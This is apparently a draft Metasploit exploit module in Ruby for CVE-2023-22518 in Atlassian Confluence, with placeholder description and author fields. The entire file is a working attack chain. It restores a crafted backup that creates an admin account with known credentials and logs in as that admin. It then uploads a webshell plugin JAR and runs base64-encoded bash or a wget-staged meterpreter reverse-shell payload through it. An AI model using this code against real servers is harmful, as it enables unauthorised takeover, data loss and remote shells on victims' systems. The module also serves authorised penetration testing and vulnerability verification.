##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Atlassian::Confluence::Version

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Atlassian Confluence Unauth JSON setup-restore RCE',
        'Description' => %q{
          replace-me
        },
        'Author' => [
          'replace-me', # discovery
          'jheysel-r7' # module
        ],
        'References' => [
          [ 'URL', 'https://jira.atlassian.com/browse/CONFSERVER-93142'],
          [ 'CVE', '2023-22518']
        ],
        'License' => MSF_LICENSE,
        'Platform' => ['win', 'linux', 'unix'],
        'Privileged' => false,
        'Arch' => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],
        'Targets' => [
          [
            'Windows Command',
            {
              'Arch' => ARCH_CMD,
              'Platform' => 'win',
              'Type' => :win_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Platform' => 'win',
              'Type' => :win_dropper,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Unix Command',
            {
              'Arch' => ARCH_CMD,
              'Platform' => [ 'unix', 'linux' ],
              'Type' => :nix_cmd
            }
          ],
          [
            'Linux Dropper',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Platform' => 'linux',
              'Type' => :nix_dropper,
              'DefaultOptions' => {
                'CMDSTAGER::FLAVOR' => 'wget',
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ],
        ],
        'DefaultTarget' => 2,
        'DisclosureDate' => '2023-10-31',
        'Notes' => {
          'Stability' => [ CRASH_SAFE, ],
          'SideEffects' => [ CONFIG_CHANGES, ], # Major config changes - this module installs an empty backup with known admin credentials
          'Reliability' => [ REPEATABLE_SESSION, ]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8090),
        OptString.new('NEW_USERNAME', [true, 'Username to be used when creating a new user with admin privileges', Faker::Internet.username], regex: /^[a-z._@]+$/),
        OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', Rex::Text.rand_text_alpha(8)]),
      ]
    )
  end

  def check
    confluence_version = get_confluence_version

    # Confluence Serer and Confluence Data Center have the same vulnerable version ranges.
    if confluence_version.between?(Rex::Version.new('1.0.0'), Rex::Version.new('7.19.15')) ||
      confluence_version.between?(Rex::Version.new('7.20.0'), Rex::Version.new('8.3.3')) ||
      confluence_version.between?(Rex::Version.new('8.4.0'), Rex::Version.new('8.4.3')) ||
      confluence_version.between?(Rex::Version.new('8.5.0'), Rex::Version.new('8.5.2'))
      return Exploit::CheckCode::Appears("Exploitable version of Confluence: #{confluence_version}")
    end

    Exploit::CheckCode::Safe("Confluence version: #{confluence_version}")
  end

  # https://passlib.readthedocs.io/en/stable/lib/passlib.hash.atlassian_pbkdf2_sha1.html
  def generate_hash(password)
    salt = OpenSSL::Random.random_bytes(16)
    iterations = 10000
    digest = OpenSSL::Digest.new('SHA1')

    key = OpenSSL::PKCS5.pbkdf2_hmac(password, salt, iterations, 32, digest)
    salted_key = salt + key
    encoded_hash = Base64.strict_encode64(salted_key)

    '{PKCS5S2}' + encoded_hash
  end

  def create_zip
    zip_file = Rex::Zip::Archive.new
    zip_contents = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-22518', 'zip_contents')

    Dir[File.join(zip_contents, '**', '**')].each do |file|
      next if File.directory?(file)

      relative_path = file.sub("#{zip_contents}/", '')
      zip_file.add_file(relative_path, File.read(file))
    end

    entities_xml = File.read(File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-22518', 'entities.xml'))
    entities_xml.gsub!('NEW_USERNAME_LOWER', datastore['NEW_USERNAME'].downcase)
    entities_xml.gsub!('NEW_USERNAME', datastore['NEW_USERNAME'])
    entities_xml.gsub!('NEW_PASSWORD_HASH', generate_hash(datastore['NEW_PASSWORD']))

    zip_file.add_file('entities.xml', entities_xml)
    zip_file.pack
  end

  def upload_backup
    zip_file = create_zip
    post_data = Rex::MIME::Message.new
    post_data.add_part('false', nil, nil, 'form-data; name="buildIndex"')
    post_data.add_part('Upload and import', nil, nil, 'form-data; name="edit"')
    post_data.add_part(zip_file, 'application/zip', 'binary', 'form-data; name="file"; filename="ZIP_DATA"')

    data = post_data.to_s
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'json', 'setup-restore.action'),
      'method' => 'POST',
      'data' => data,
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'keep_cookies' => true,
      'headers' => {
        'X-Atlassian-Token' => 'no-check',
      },
      'vars_get' => {
        'synchronous' => 'true'
      }
    }, 120)

    fail_with(Failure::UnexpectedReply, 'The endpoint /json/setup-restore.action did not respond with a 302') unless res&.code == 302 # Location: /json/setup-restore-progress.action?taskId=
    print_good("Exploit Success! Login Using '#{datastore['NEW_USERNAME']} :: #{datastore['NEW_PASSWORD']}'")
  end

  def authenticate_to_confluence
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'dologin.action'),
      'keep_cookies' => true,
      'vars_post' => {
        'os_username' => datastore['NEW_USERNAME'],
        'os_password' => datastore['NEW_PASSWORD'],
        'login' => 'Log in',
        'os_destination' => '/index.action'
      }
    })

    fail_with(Failure::UnexpectedReply, 'Unable to authenticate to confluence with the newly set credentials') unless res&.code == 302

    res2 = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.action'),
      'keep_cookies' => true
    })

    fail_with(Failure::UnexpectedReply, 'Loading the dashboard after authenticating has failed') unless res2&.code == 200
    atlassian_token = res2.get_html_document.xpath("//meta[@id='atlassian-token' and @name='atlassian-token']/@content").text

    fail_with(Failure::UnexpectedReply, 'Unable to retrieve the atlassian_token from the response') unless atlassian_token
    print_good('Successfully authenticated using the username and password set by exploiting CVE-2023-22518')
    atlassian_token
  end

  def authenticate_to_plugins_config(atlassian_token)
    res3 = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'doauthenticate.action'),
      'keep_cookies' => true,
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'atl_token' => atlassian_token,
        'password' => datastore['NEW_PASSWORD'],
        'authenticate' => 'Confirm',
        'destination' => '/plugins/servlet/upm'
      }
    })

    fail_with(Failure::UnexpectedReply, 'Unable to authenticate to the restricted plugins area') unless res3&.code == 302 && res3.headers['X-Atlassian-WebSudo'] == 'Has-Authentication'

    res4 = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/plugins/servlet/upm'),
      'keep_cookies' => true
    })

    fail_with(Failure::UnexpectedReply, 'Unable to authenticate to the restricted plugins area') unless res4&.code == 200
  end

  def get_upm_token
    # https://github.com/atlassian-api/atlassian-python-api/blob/master/atlassian/jira.py#L3356-L3361
    res = send_request_cgi({
      'method' => 'HEAD',
      'uri' => normalize_uri(target_uri.path, 'rest', 'plugins', '1.0/'),
      'keep_cookies' => true,
      'headers' => {
        'X-Atlassian-Token' => 'no-check'
      }
    })
    fail_with(Failure::UnexpectedReply, 'Unable to retrieve the UPM token using the rest API') unless res&.code == 200 && res&.headers&.[]('upm-token')

    res.headers['upm-token']
  end

  def upload_webshell(upm_token)
    webshell_jar = File.read(File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-22518', 'atlplug.jar'))
    post_data = Rex::MIME::Message.new
    post_data.add_part(webshell_jar, 'application/java-archive', 'binary', "form-data; name=\"plugin\"; filename=\"#{rand_text_alphanumeric(8..16)}.jar\"")
    post_data.add_part('', nil, nil, 'form-data; name="url"')

    data = post_data.to_s
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'rest', 'plugins', '1.0/'),
      'method' => 'POST',
      'data' => data,
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'keep_cookies' => true,
      'vars_get' => {
        'token' => upm_token
      }
    })
  end

  def execute_command(cmd, _opts = {})
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'plugins', 'servlet', 'com.jsos.shell', 'ShellServlet'),
      'keep_cookies' => true,
      'ctype' => 'application/x-www-form-urlencoded',
      'headers' => {
        'Accept' => 'text/html,application/xhtml+xml'
      },
      'vars_get' => {
        'act' => 3
      },
      'data' => "cmd=#{cmd}"
    )
    # no response indicates the command has run successfully
  end

  def exploit
    # Restore back from .zip
    print_status("Setting credentials: #{datastore['NEW_USERNAME']}:#{datastore['NEW_PASSWORD']}")
    upload_backup

    # Authenticate once to access confluence
    atlassian_token = authenticate_to_confluence

    # Confluence makes your authenticate a second time when attempting to access the plugins configuration page
    authenticate_to_plugins_config(atlassian_token)

    # Token required for uploading a new plugin
    upm_token = get_upm_token

    # Upload WebShell plugin
    upload_webshell(upm_token)
    sleep(5)

    # Send payload to the webshell
    case target['Type']
    when :nix_cmd
      bash_cmd = "eval $(echo #{Rex::Text.encode_base64("bash -c \"#{payload.encoded}\"")} | base64 -d)"
      execute_command(bash_cmd)
    when :nix_dropper
      execute_cmdstager
    end
  end
end
